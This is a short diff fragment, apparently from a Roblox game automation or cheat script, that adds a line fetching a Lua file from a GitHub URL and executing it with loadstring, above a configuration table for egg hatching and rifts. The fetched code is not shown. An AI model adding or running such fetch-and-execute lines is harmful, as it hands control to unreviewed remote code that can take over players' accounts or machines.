@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/friend.lua"))()
+
 getgenv().Config = {
     ["Hatching"] = {
         ["Rifts"] = {
